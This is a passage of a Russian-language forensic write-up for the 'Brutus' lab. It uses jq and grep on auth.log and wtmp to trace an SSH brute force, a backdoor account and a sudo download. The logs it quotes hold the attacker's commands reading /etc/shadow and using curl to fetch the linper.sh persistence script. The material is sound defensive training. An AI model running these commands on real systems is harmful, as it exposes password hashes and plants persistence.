+            Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68 port 46876 ssh2	06:31:41
+            Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68 port 46890 ssh2	06:31:41
+            Mar  6 06:31:41	sshd	Connection closed by authenticating user root 65.2.161.68 port 46852 [preauth]	06:31:41
+            Mar  6 06:31:41	sshd	Connection closed by authenticating user root 65.2.161.68 port 46876 [preauth]	06:31:41
+            Mar  6 06:31:42	sshd	Connection closed by authenticating user root 65.2.161.68 port 46890 [preauth]	06:31:42
+            Mar  6 06:32:44	sshd	Accepted password for root from 65.2.161.68 port 53184 ssh2	06:32:44
+            Mar  6 06:37:24	sshd	Disconnected from user root 65.2.161.68 port 53184	06:37:24
+
+
+    Можно заметить удачное подключение в 06:31:40 (Accepted password for root from 65.2.161.68 port 34782 ssh2) было сразу же разорвано (Disconnected from user root 65.2.161.68 port 34782)
+    Как правило, если подключаться для выполнения других действий, то сразу разрывать соединение нет никакого смысла
+    А вот разрыв, сделующий сразу за подключением, указывает на элемент брутфорса
+    Значит нам надо искать другое подобное подключение
+
+    WTMP-лог не отображает брутфорс подклбючения
+    Так что, если мы опять обратимся к нему, то можем увидеть "устойчивое" подклюение
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ grep -E "65.2.161.68" wtmp_utctime.out
+                
+            |"USER"     |"2549"  |"pts/1"|"ts/1"|"root"       |"65.2.161.68"   |"0"   |"0"   |"0"      |"06:32:45, Wednesday, 06 March 2024" |"387923"|"65.2.161.68"  |
+            |"USER"     |"2667"  |"pts/1"|"ts/1"|"cyberjunkie"|"65.2.161.68"   |"0"   |"0"   |"0"      |"06:37:35, Wednesday, 06 March 2024" |"475575"|"65.2.161.68"  |
+    
+    Для подтверждения проверим наш auth.log
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ jq -r 'select((.msg | test(" root"; "i")) and (.msg | test("65\\.2\\.161\\.68"))) | [.ts, .program, .msg, .time] | @tsv' auth_parsed.jsonl 
+
+            Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68 port 46852 ssh2	06:31:39
+            Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68 port 46876 ssh2	06:31:39
+            Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68 port 46890 ssh2	06:31:39
+            Mar  6 06:31:40	sshd	Accepted password for root from 65.2.161.68 port 34782 ssh2	06:31:40
+            Mar  6 06:31:40	sshd	Disconnected from user root 65.2.161.68 port 34782	06:31:40
+            Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68 port 46852 ssh2	06:31:41
+            Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68 port 46876 ssh2	06:31:41
+            Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68 port 46890 ssh2	06:31:41
+            Mar  6 06:31:41	sshd	Connection closed by authenticating user root 65.2.161.68 port 46852 [preauth]	06:31:41
+            Mar  6 06:31:41	sshd	Connection closed by authenticating user root 65.2.161.68 port 46876 [preauth]	06:31:41
+            Mar  6 06:31:42	sshd	Connection closed by authenticating user root 65.2.161.68 port 46890 [preauth]	06:31:42
+            Mar  6 06:32:44	sshd	Accepted password for root from 65.2.161.68 port 53184 ssh2	06:32:44
+            Mar  6 06:37:24	sshd	Disconnected from user root 65.2.161.68 port 53184	06:37:24
+    
+    Мы видим очень близкие значения
+    Такое вполне допустимо, так как auth.log отображает запрос на подключение, а wtmp непосредственно само подключение
+    Поэтому используем данные из wtmp   -   2024-03-06 06:32:45
+
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    + Задание 4 - Определить номер сессии входа злоумышленика +
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Номер сеанса присваивается сразу после принятия пароля.
+    А как мы уже знаем, пароль был принят/подтвержден системой два раза
+        Первый  -   при брутфорсе
+        Второй  -   при ручном ходе в систему
+    Следовательно, у нас будет два номера сессии
+
+    Если мы вернемся к тому списоку комманд, коорый был обнаружен в auth лог-файле, то найдем там одну примечательную комманду  -   systmed-logind
+    Простой гугл-поиск поведает нам, что 
+        systemd-login   -   это системная служба, управляющая входами пользователей.
+                            Она отвечает за: регистрацию сеансов пользователей в logind через PAM-модуль pam_systemd(8).
+    
+    Используя эту информацию мы можем получить следующие данные
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ jq -r 'select(.program | test("systemd-logind")) | [.ts, .program, .msg, .time] | @tsv' auth_parsed.jsonl 
+
+            Mar  6 06:19:54	systemd-logind	New session 6 of user root.	06:19:54
+            Mar  6 06:31:40	systemd-logind	New session 34 of user root.	06:31:40
+            Mar  6 06:31:40	systemd-logind	Session 34 logged out. Waiting for processes to exit.	06:31:40
+            Mar  6 06:31:40	systemd-logind	Removed session 34.	06:31:40
+            Mar  6 06:32:44	systemd-logind	New session 37 of user root.	06:32:44
+            Mar  6 06:37:24	systemd-logind	Session 37 logged out. Waiting for processes to exit.	06:37:24
+            Mar  6 06:37:24	systemd-logind	Removed session 37.	06:37:24
+            Mar  6 06:37:34	systemd-logind	New session 49 of user cyberjunkie.	06:37:34
+
+    Однако, полученные сведения нам не сильно помогли, так как у нас есть несколько номеров сессий и который из них правильный мы пока не знаем
+    Конечно, мы можем сопоставить примерное время входа, но это всеравно будет угадывание
+    Хотя в нашем случае это может и сработать, но когда содержание auth лог-файла огромное, такой метод не совсем приемлим
+
+    Поэтому, нам стоит немного расширить наш поиск
+    Как мы уже знаем, имя пользователя из-под которого злоумышленник проникал в систему   -   root
+    Таким образом, мы будем производить поиск по трем дополнительным ключевым словам    -   session | Accepted | Disconnected
+    Анализировать мы будем только auth лог-файл, так как WTMP не содержит информации о номере сессии
+    *** Забегу наперд и скажу, что я также добавлю фильтр "grep -v -E <key-word1|key-word2">, чтобы убрать всемь не нужный шум и анализировать только среди sshd & systemd-logind
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ jq -r 'select((.msg | test("session|Accepted|Disconnected"; "i")) and (.msg | test("root"; "i"))) | [.ts, .program, .msg, .time] | @tsv' auth_parsed.jsonl | grep -v -E "CRON|sudo"    
+
+            Mar  6 06:19:54	sshd	Accepted password for root from 203.101.190.9 port 42825 ssh2	06:19:54
+            Mar  6 06:19:54	sshd	pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)	06:19:54
+            Mar  6 06:19:54	systemd-logind	New session 6 of user root.	06:19:54
+            Mar  6 06:19:54	systemd	pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)	06:19:54
+            Mar  6 06:31:40	sshd	Accepted password for root from 65.2.161.68 port 34782 ssh2	06:31:40
+            Mar  6 06:31:40	sshd	pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)	06:31:40
+            Mar  6 06:31:40	systemd-logind	New session 34 of user root.	06:31:40
+            Mar  6 06:31:40	sshd	Disconnected from user root 65.2.161.68 port 34782	06:31:40
+            Mar  6 06:31:40	sshd	pam_unix(sshd:session): session closed for user root	06:31:40
+            Mar  6 06:32:44	sshd	Accepted password for root from 65.2.161.68 port 53184 ssh2	06:32:44
+            Mar  6 06:32:44	sshd	pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)	06:32:44
+            Mar  6 06:32:44	systemd-logind	New session 37 of user root.	06:32:44
+            Mar  6 06:37:24	sshd	Disconnected from user root 65.2.161.68 port 53184	06:37:24
+            Mar  6 06:37:24	sshd	pam_unix(sshd:session): session closed for user root	06:37:24
+    
+    Мы получили 2 номера сессий -   34 и 37
+    Давайте вернемся к WTMP лог-файлу и посмотрим, а сколько там было записей для пользователя root и IP-адреса 65.2.161.68
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ cat wtmp_utctime.out | grep -i "user" | grep -i "root" | grep -i "65.2.161.68"
+
+            |"USER"     |"2549"  |"pts/1"|"ts/1"|"root"       |"65.2.161.68"   |"0"   |"0"   |"0"      |"06:32:45, Wednesday, 06 March 2024" |"387923"|"65.2.161.68"  |
+    
+    WTMP показал нам только одну запись с временной меткой "06:32:45, Wednesday, 06 March 2024"
+    А это очень близко к сессии с номером 37
+
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    + Задание 5 - Определить имя нового пользователя, который был добавлен злоумышленником +
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Для добавления поьзователя чаще всего используется комманда -   useradd
+    А как мы помним из списка используемых команда, такая команда встречалась 1 раз
+    Так, что обратимся к лог-файлу auth
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ jq -r 'select((.msg | test("user|root|group"; "i"))) | [.ts, .program, .msg, .time] | @tsv' auth_parsed.jsonl | grep -v -i -E "CRON|PAM|Failed|Invalid|preauth"
+
+            Mar  6 06:19:54	sshd	Accepted password for root from 203.101.190.9 port 42825 ssh2	06:19:54
+            Mar  6 06:19:54	systemd-logind	New session 6 of user root.	06:19:54
+            Mar  6 06:31:40	sshd	Accepted password for root from 65.2.161.68 port 34782 ssh2	06:31:40
+            Mar  6 06:31:40	systemd-logind	New session 34 of user root.	06:31:40
+            Mar  6 06:31:40	sshd	Disconnected from user root 65.2.161.68 port 34782	06:31:40
+            Mar  6 06:32:44	sshd	Accepted password for root from 65.2.161.68 port 53184 ssh2	06:32:44
+            Mar  6 06:32:44	systemd-logind	New session 37 of user root.	06:32:44
+            Mar  6 06:34:18	groupadd	group added to /etc/group: name=cyberjunkie, GID=1002	06:34:18
+            Mar  6 06:34:18	groupadd	group added to /etc/gshadow: name=cyberjunkie	06:34:18
+            Mar  6 06:34:18	groupadd	new group: name=cyberjunkie, GID=1002	06:34:18
+            Mar  6 06:34:18	useradd	new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1	06:34:18
+            Mar  6 06:34:31	chfn	changed user 'cyberjunkie' information	06:34:31
+            Mar  6 06:35:15	usermod	add 'cyberjunkie' to group 'sudo'	06:35:15
+            Mar  6 06:35:15	usermod	add 'cyberjunkie' to shadow group 'sudo'	06:35:15
+            Mar  6 06:37:24	sshd	Received disconnect from 65.2.161.68 port 53184:11: disconnected by user	06:37:24
+            Mar  6 06:37:24	sshd	Disconnected from user root 65.2.161.68 port 53184	06:37:24
+            Mar  6 06:37:34	systemd-logind	New session 49 of user cyberjunkie.	06:37:34
+            Mar  6 06:37:57	sudo	cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow	06:37:57
+            Mar  6 06:39:38	sudo	cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh	06:39:38
+
+    Проследив хронологию собтыий, можно сделать вывод, что когда злоумышленник был под пользователем "root" он создал только одного пользователя и наделил его высокими привелениями
+    Имя пользователя    -   cyberjunkie
+
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    + Задание 6 - Узнать номер индетифирактора подгруппы MITRE ATT&CK, используемый для такого рода атаки +
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Простой гугл-поиск указывает нам, что этот тип атак относиться к категории  -   Persistance, Create Account
+    Тем не менее, там представлены 3 подкатегории:
+
+        -   Local Account
+        -   Domain Account
+        -   Cloud Account
+    
+    Последняя подкатегория отметается сразу, так как не было признаков, указывающих на облачные сервисы
+    Тоже самое относительно доменной среды
+    Так что это была Local Account (T1136.001)
+
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    + Задание 7 - Определить (согласно auth.log) во сколько завершился первый сеанс SSH злоумышленника +
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Ну тут все относительно просто.
+    Нам надо сделать выборку по "Accepted password|Disconnected", имени пользователя "root" и IP-адресу злоумышленника
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ jq -r 'select((.msg | test("Disconnected|Accepted password"; "i")) and (.msg | test("root"; "i")) and (.msg | test("65\\.2\\.161\\.68"))) | [.ts, .program, .msg, .time] | @tsv' auth_parsed.jsonl  
+
+            Mar  6 06:31:40	sshd	Accepted password for root from 65.2.161.68 port 34782 ssh2	06:31:40
+            Mar  6 06:31:40	sshd	Disconnected from user root 65.2.161.68 port 34782	06:31:40
+            Mar  6 06:32:44	sshd	Accepted password for root from 65.2.161.68 port 53184 ssh2	06:32:44
+            Mar  6 06:37:24	sshd	Disconnected from user root 65.2.161.68 port 53184	06:37:24
+    
+    Как мы также помним из результатов выборки на один из прошлых вопросов  -   злоумышленник подключался 3 раза (два под root и один под cyberjunkie)
+    Cyberjunkie нас не интересует, а вот под root вполне
+    Однако нам надо выбрать 1 из двух вариантов
+    И хотя auth.log содержит две сессии, но только одна является правильным ответом
+    Для определения какая, нам понадобиться обратиться к WTMP
+    *** Заранее скажу, что фильтр должен включать временную метку
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ cat wtmp_utctime.out | grep -i -E "USER.*root.*65.2.161.68|DEAD.*06:3" 
+
+            |"USER"     |"2549"  |"pts/1"|"ts/1"|"root"       |"65.2.161.68"   |"0"   |"0"   |"0"      |"06:32:45, Wednesday, 06 March 2024" |"387923"|"65.2.161.68"  |
+            |"DEAD"     |"2491"  |"pts/1"|""    |""           |""              |"0"   |"0"   |"0"      |"06:37:24, Wednesday, 06 March 2024" |"590579"|"0.0.0.0"      |
+                                                                                                                                                                                                                   
+    Как мы видим, согалсно WTMP сеанс завершился в 06:37:24, что совпадает с auth.log
+
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    + Задание 8 - Обнаружить команду, которую злоумышленник использовал для загрузки скрипта, при помощи sudo +
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Фильтруем наш auth.log по использованной команде sudo
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ Mar  6 06:37:57	sudo	cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow	06:37:57
+
+            Mar  6 06:37:57	sudo	pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)	06:37:57
+            Mar  6 06:37:57	sudo	pam_unix(sudo:session): session closed for user root	06:37:57
+            Mar  6 06:39:38	sudo	cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh	06:39:38
+            Mar  6 06:39:38	sudo	pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)	06:39:38
+            Mar  6 06:39:39	sudo	pam_unix(sudo:session): session closed for user root	06:39:39
+
+    Один из идикаторов загрузки скрипта со стороннего URL, это комманда "curl"
+    Мы конечно могли сразу включить ее в фильтр, но наш вывод достаточно маленький, чтобы обнаружить ее без дополнительных параметров
+    
